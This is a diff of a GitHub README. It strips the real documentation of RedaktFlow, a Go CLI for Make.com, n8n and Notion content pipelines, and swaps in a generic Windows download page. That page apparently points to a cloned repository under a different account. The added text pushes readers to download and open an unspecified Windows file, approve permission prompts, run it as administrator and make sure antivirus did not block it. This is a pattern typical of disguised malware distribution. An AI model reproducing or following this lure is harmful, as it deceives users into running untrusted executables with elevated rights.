@@ -1,261 +1,230 @@
-<p align="center">
-  <img src="logo.svg" alt="RedaktFlow" width="320">
-</p>
+# 🤖 redaktflow - AI Content Ops for Windows Teams
 
-<h1 align="center">RedaktFlow</h1>
-<p align="center">AI content operations engine for Make.com, n8n, and Notion.</p>
+[![Download redaktflow](https://img.shields.io/badge/Download-redaktflow-blue?style=for-the-badge)](https://github.com/zonary-genusoryx71/redaktflow)
 
-<p align="center">
-  <a href="https://github.com/renezander030/redaktflow/stargazers"><img src="https://img.shields.io/github/stars/renezander030/redaktflow?style=flat-square" alt="Stars"></a>
-  <a href="https://github.com/renezander030/redaktflow/blob/master/LICENSE"><img src="https://img.shields.io/github/license/renezander030/redaktflow?style=flat-square" alt="License"></a>
-  <img src="https://img.shields.io/badge/Go-1.24-00ADD8?style=flat-square&logo=go" alt="Go 1.24">
-  <img src="https://img.shields.io/badge/build-passing-brightgreen?style=flat-square" alt="Build">
-</p>
+## 🧭 What redaktflow does
 
-RedaktFlow monitors, optimizes, and orchestrates your content automation workflows. It connects to Make.com, n8n, and Notion, adds AI-powered content drafting and repurposing, and keeps a human in the loop before anything publishes.
+redaktflow helps you manage AI content work in one place. It is built for content tasks that move between tools like Make.com, n8n, and Notion. You can use it to organize drafts, route approvals, and keep content work moving with less manual effort.
 
-Runs as a CLI tool on your laptop or as a daemon on a server. No VPS required.
+It is meant for people who want a simple way to run content operations without switching between many apps.
 
-**Your workflows run on rules. This adds editorial judgment.**
+## 💻 Before you start
 
-## Quickstart
+You need:
 
-```bash
-git clone https://github.com/renezander030/redaktflow.git && cd redaktflow
-cp secrets.yaml.example secrets.yaml   # add your API keys
-go build -o redaktflow .
-```
+- A Windows PC
+- A stable internet connection
+- Permission to download and run software
+- A browser to open the download page
 
-Three modes of operation:
+You do not need coding skills to use it on Windows.
 
-```bash
-# CLI — agent-callable subcommands, JSON output
-./redaktflow notion list-dbs
-./redaktflow make list-scenarios
-./redaktflow status
+## 🚀 Download redaktflow
 
-# One-shot — run a single pipeline and exit
-./redaktflow --run scenario-health
+Visit this page to download and set up redaktflow:
 
-# Daemon — scheduled pipelines on a loop
-./redaktflow
-```
+[Open the redaktflow download page](https://github.com/zonary-genusoryx71/redaktflow)
 
-## CLI Reference
+## 🛠️ Install on Windows
 
-Agent-first interface. Every command returns structured JSON. Use from scripts, Claude Code, or any agent harness.
+Follow these steps:
 
-```bash
-# Notion
-./redaktflow notion list-dbs
-./redaktflow notion get-db --id <database_id>
-./redaktflow notion query --db <database_id> --filter '{"property":"Status","select":{"equals":"Draft"}}'
-./redaktflow notion create-db --parent <page_id> --name "Content Calendar" --props '{"Status":"select","Platform":"select","Date":"date"}'
-./redaktflow notion create-page --db <database_id> --props '{"Name":{"title":[{"text":{"content":"Post #1"}}]}}'
-./redaktflow notion update-page --id <page_id> --props '{"Status":{"select":{"name":"Published"}}}'
+1. Open the download page in your browser.
+2. Look for the latest release or download file.
+3. Download the Windows file to your computer.
+4. Open the file from your Downloads folder.
+5. If Windows asks for permission, choose Yes or Run.
+6. Follow the setup steps on screen.
+7. Start redaktflow from the desktop shortcut or Start menu if one appears.
 
-# Make.com
-./redaktflow make list-scenarios
-./redaktflow make get-scenario --id <scenario_id>
-./redaktflow make get-blueprint --id <scenario_id>
-./redaktflow make set-blueprint --id <scenario_id> --file blueprint.json
-./redaktflow make create-scenario --name "Content Pipeline" --blueprint blueprint.json
-./redaktflow make run --id <scenario_id>
-./redaktflow make executions --id <scenario_id> --status error --limit 5
-./redaktflow make activate --id <scenario_id>
+If the file opens as a zip folder, extract it first, then open the app file inside.
 
-# n8n
-./redaktflow n8n list-workflows
-./redaktflow n8n get-workflow --id <workflow_id>
-./redaktflow n8n executions --status error --limit 10
-./redaktflow n8n retry --id <execution_id>
-./redaktflow n8n activate --id <workflow_id>
+## 📦 What you can do with it
 
-# Status — connection health for all platforms
-./redaktflow status
+redaktflow is built for content operations, so it can help with tasks like:
 
-# Help
-./redaktflow help
-```
+- Organizing content requests
+- Sending content through approval steps
+- Moving content between tools
+- Tracking draft status
+- Keeping a record of changes
+- Linking content work to Notion pages
+- Using Make.com and n8n workflows
+- Adding human review before final output
 
-All commands return JSON:
-```json
-{
-  "ok": true,
-  "command": "notion list-dbs",
-  "data": [...],
-  "count": 3
-}
-```
+## 🧩 Typical use cases
 
-Define your pipelines in `config.yaml`, your prompts in `skills/`, and RedaktFlow handles the rest.
+You can use redaktflow for:
 
-## What It Does
+- Blog production
+- Social post pipelines
+- AI draft review
+- Content handoff between teams
+- Publishing checklists
+- Content updates for client work
+- Internal knowledge content
+- Workflow steps that need human approval
 
-| Capability | How it works |
-|---|---|
-| **Monitor** | Watch Make.com scenarios and n8n workflows for failures, alert with diagnostics |
-| **Optimize** | AI analyzes workflow blueprints for redundancy, error handling gaps, cost waste |
-| **Draft** | Generate platform-specific content (LinkedIn, Dev.to, Twitter/X, Hashnode) from topics |
-| **Repurpose** | Transform content across platforms -- re-angle, don't just resize |
-| **Schedule** | AI-planned content calendar across platforms with topic spreading |
-| **Approve** | Every piece of content goes through human review before publishing |
+## ⚙️ How it fits into your workflow
 
-## Integrations
+redaktflow works best when you already use automation tools. A common setup looks like this:
 
-| Platform | What RedaktFlow does |
-|---|---|
-| **Make.com** | List/create/update scenarios, monitor executions, read/write blueprints, trigger runs |
-| **n8n** | List/create/update workflows, monitor executions, retry failures, audit nodes |
-| **Notion** | Query databases, create/update pages, sync content calendars, manage structured data |
-| **Slack / Telegram** | Operator approval channel (human-in-the-loop) |
+1. A new content request arrives in Notion or another tool.
+2. Make.com or n8n sends the task into redaktflow.
+3. AI helps draft or sort the content.
+4. A person reviews the result.
+5. The approved content moves to the next step.
 
-Adding a new integration means writing one Go file. Each connector follows the same pattern: fetch data, classify with AI, draft output, get human approval.
+This keeps your content process steady and easy to follow.
 
-## How It Works
+## 🧠 Key ideas
 
-RedaktFlow runs pipelines. Each pipeline is a sequence of typed steps:
+redaktflow is built around a few simple ideas:
 
-| Step type | What it does |
-|---|---|
-| `deterministic` | Plain code: fetch scenarios, check executions, pull workflows |
-| `ai` | LLM inference with a skill template, budget-checked |
-| `approval` | Human-in-the-loop: operator reviews before proceeding |
+- AI helps speed up first drafts
+- People still make the final call
+- Work should move through clear steps
+- Content should stay organized across tools
+- Automation should reduce repeat work
 
-Example pipelines:
+## 📋 Basic system needs
 
-```yaml
-pipelines:
-  # Alert on failed Make.com scenarios with AI diagnosis
-  - name: scenario-health
-    schedule: 1h
-    steps:
-      - name: check-failures
-        type: deterministic
-        action: make_failed_executions
-        vars:
-          scenario_id: "12345"
+For smooth use on Windows, a good setup includes:
 
-      - name: diagnose
-        type: ai
-        skill: optimize-scenario
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- Enough free disk space for the app and related files
+- A modern browser for opening the download page
+- Access to Make.com, n8n, or Notion if you plan to connect them
 
-      - name: alert
-        type: deterministic
-        action: notify
+A newer computer will give you a better experience if you run many tools at once.
 
-  # Draft a LinkedIn post from a topic, human approves
-  - name: content-draft
-    schedule: manual
-    steps:
-      - name: mock-input
-        type: deterministic
+## 🔍 File and folder tips
 
-      - name: draft
-        type: ai
-        skill: draft-post
+After you install redaktflow, keep these habits in mind:
 
-      - name: review
-        type: approval
-        mode: hitl
-        channel: telegram
+- Save the downloaded file in a folder you can find later
+- Do not move files while the app is open
+- Keep your workflow files in one place
+- Use clear folder names for content projects
+- Back up important content data on a regular basis
 
-  # Weekly audit of n8n workflows
-  - name: workflow-audit
-    schedule: 7d
-    steps:
-      - name: fetch-workflows
-        type: deterministic
-        action: n8n_list_workflows
+## 🧪 First run checklist
 
-      - name: analyze
-        type: ai
-        skill: optimize-scenario
+When you open redaktflow for the first time:
 
-      - name: report
-        type: deterministic
-        action: notify
-```
+1. Check that the app starts without errors.
+2. Look for any setup screen or welcome screen.
+3. Connect your content tools if asked.
+4. Add a sample content task.
+5. Run a test workflow.
+6. Confirm that the task moves through each step.
+7. Review the output before using it for real work.
 
-## Governance
+## 🔗 Connect with your tools
 
-Same guardrails as production operations tools:
+redaktflow is designed to work with tools many teams already use:
 
-- **Token budgets** -- per-step, per-pipeline, per-day limits with hard circuit breakers
-- **Human-in-the-loop** -- every piece of outbound content requires operator approval
-- **Output validation** -- AI output validated against JSON schemas
-- **Audit trail** -- full logging of what was drafted, reviewed, and published
+- Make.com for visual automation
+- n8n for workflow steps
+- Notion for content and task storage
+- LLM services for AI writing and review
+- Human review steps for approval
 
-## Configuration
+This makes it easier to build a content process that fits your team.
 
-### config.yaml
+## 📝 Common workflow examples
 
-```yaml
-make:
-  api_key_env: MAKE_API_KEY
-  region: eu1
-  team_id: 12345
+Here are simple examples of how you might use redaktflow:
 
-n8n:
-  base_url: https://your-n8n.example.com
-  api_key_env: N8N_API_KEY
+### Blog draft flow
+- A topic is added
+- AI creates a draft
+- A person checks the tone
+- The draft goes to final review
+- The content is saved in Notion
 
-notion:
-  api_key_env: NOTION_API_KEY
+### Social content flow
+- A campaign brief is added
+- AI generates post ideas
+- A person chooses the best one
+- The post is approved
+- The final version is stored for publishing
 
-provider:
-  type: openrouter
-  api_key_env: OPENROUTER_API_KEY
-  base_url: https://openrouter.ai/api/v1
+### Client content flow
+- A request comes in
+- redaktflow sends it to the right step
+- AI prepares the first version
+- A reviewer checks it
+- The completed work is passed on
 
-budgets:
-  per_step_tokens: 2048
-  per_pipeline_tokens: 10000
-  per_day_tokens: 100000
-```
+## 🧰 Troubleshooting
 
-### Skills
+If the app does not open:
 
-YAML prompt templates in `skills/`. Each skill defines the system prompt, input variables, and output schema.
+- Check that the download finished
+- Try running the file again
+- Right-click the file and choose Run as administrator
+- Make sure your antivirus did not block it
+- Restart your computer and try again
 
-```yaml
-# skills/draft-post.yaml
-name: draft-post
-role: drafter
-prompt: |
-  Topic: {{topic}}
-  Platform: {{platform}}
-  Write for practitioners, not beginners...
-output_schema:
-  title: {type: string}
-  body: {type: string}
-  platform: {type: string}
-```
+If a workflow does not move forward:
 
-## Project Structure
+- Check that each step is connected
+- Confirm that your automation tool is online
+- Make sure required fields are filled in
+- Review the settings for Notion, Make.com, or n8n
+- Try a smaller test workflow first
 
-```
-redaktflow/
-  main.go          # Engine: pipeline runner, scheduler, guardrails
-  cli.go           # Agent-callable subcommand interface (JSON output)
-  make.go          # Make.com integration (scenarios, executions, blueprints)
-  n8n.go           # n8n integration (workflows, executions, credentials)
-  notion.go        # Notion integration (databases, pages, content calendar)
-  config.yaml      # Pipelines, models, budgets, timeouts
-  secrets.yaml     # Private config (operator IDs) -- gitignored
-  skills/          # Prompt templates with schema validation
-    draft-post.yaml
-    repurpose-content.yaml
-    optimize-scenario.yaml
-    schedule-content.yaml
-```
+If the page does not load:
 
-## Star History
+- Refresh the browser
+- Check your internet connection
+- Try another browser
+- Open the link again from a fresh tab
 
-If RedaktFlow is useful to you, consider giving it a star. It helps others discover the project.
+## 📁 Project focus
 
-[![Star History Chart](https://api.star-history.com/svg?repos=renezander030/redaktflow&type=Date)](https://star-history.com/#renezander030/redaktflow&Date)
+redaktflow is aimed at content teams that want:
 
-## License
+- Less manual copy-paste work
+- Clear content steps
+- Better review control
+- Simple AI support
+- A cleaner handoff between tools
+- Easier content tracking
 
-MIT. See [LICENSE](LICENSE).
+## 🔐 Working with AI content
+
+When you use AI in content work, it helps to keep a review step in place. redaktflow supports that kind of process by keeping people in the loop before content moves on. That is useful for brand voice, accuracy, and final approval
+
+## 📌 Suggested setup path
+
+If you are new to this kind of tool, use this order:
+
+1. Download the app
+2. Open it on Windows
+3. Learn the basic screens
+4. Add one test workflow
+5. Connect one tool, like Notion
+6. Add Make.com or n8n later
+7. Expand only after the first test works
+
+This keeps setup simple and reduces mistakes
+
+## 📎 Download again
+
+If you need to return to the file later, use this link:
+
+[Go to the redaktflow download page](https://github.com/zonary-genusoryx71/redaktflow)
+
+## 🗂️ Good ways to use it
+
+redaktflow works well if you want to:
+
+- Keep content work in order
+- Cut down on repeated admin tasks
+- Add AI to your workflow
+- Review drafts before publishing
+- Move content between teams and tools
+- Store task steps in a clear process
